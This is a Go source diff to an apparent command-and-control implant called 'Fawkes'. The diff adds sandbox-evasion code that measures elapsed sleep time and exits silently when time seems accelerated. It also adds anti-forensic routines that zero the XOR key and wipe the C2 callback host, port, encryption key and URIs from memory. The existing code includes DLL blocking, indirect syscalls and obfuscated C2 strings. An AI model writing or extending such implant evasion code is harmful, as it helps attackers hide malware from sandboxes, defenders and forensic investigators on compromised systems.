@@ -63,6 +63,7 @@ var (
 	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
 	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
+	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
 )
 
 func main() {
@@ -84,6 +85,8 @@ func runAgent() {
 			hostHeader = xorDecodeString(hostHeader, keyBytes)
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			// Zero the XOR key — no longer needed after deobfuscation
+			zeroBytes(keyBytes)
 		}
 	}
 
@@ -282,6 +285,11 @@ func runAgent() {
 		commands.SetBlockDLLs(true)
 	}
 
+	// Clear build-time globals — all values have been copied into agent/profile structs.
+	// Prevents memory forensics from extracting sensitive config from the data segment.
+	sandboxGuardEnabled := sandboxGuard == "true"
+	clearGlobals()
+
 	// Initialize command handlers
 	commands.Initialize()
 
@@ -335,12 +343,12 @@ checkinDone:
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool) {
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
 
@@ -412,9 +420,16 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}(task)
 			}
 
-			// Sleep before next iteration
+			// Sleep before next iteration — with optional sandbox detection
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-			time.Sleep(sleepTime)
+			if sandboxGuardEnabled {
+				if !guardedSleep(sleepTime) {
+					log.Printf("[INFO] Sleep skipping detected, exiting")
+					return
+				}
+			} else {
+				time.Sleep(sleepTime)
+			}
 		}
 	}
 }
@@ -679,4 +694,45 @@ func xorDecodeString(encoded string, key []byte) string {
 		result[i] = b ^ key[i%len(key)]
 	}
 	return string(result)
+}
+
+// guardedSleep performs a sleep with sandbox detection. If the sleep completes
+// in less than 75% of the expected duration, it indicates a sandbox is
+// fast-forwarding time. Returns true if sleep was normal, false if skipped.
+func guardedSleep(d time.Duration) bool {
+	if d <= 0 {
+		return true
+	}
+	before := time.Now()
+	time.Sleep(d)
+	elapsed := time.Since(before)
+	// If less than 75% of the requested duration actually elapsed,
+	// the sandbox is accelerating time.
+	threshold := d * 3 / 4
+	return elapsed >= threshold
+}
+
+// zeroBytes overwrites a byte slice with zeros to clear sensitive data from memory.
+func zeroBytes(b []byte) {
+	for i := range b {
+		b[i] = 0
+	}
+}
+
+// clearGlobals zeros out build-time global variables after they have been
+// copied into the agent/profile structs. This prevents sensitive config
+// data (encryption keys, C2 URLs, UUIDs) from lingering in the binary's
+// data segment where memory forensics tools could extract them.
+func clearGlobals() {
+	payloadUUID = ""
+	callbackHost = ""
+	callbackPort = ""
+	userAgent = ""
+	encryptionKey = ""
+	getURI = ""
+	postURI = ""
+	hostHeader = ""
+	proxyURL = ""
+	customHeaders = ""
+	xorKey = ""
 }
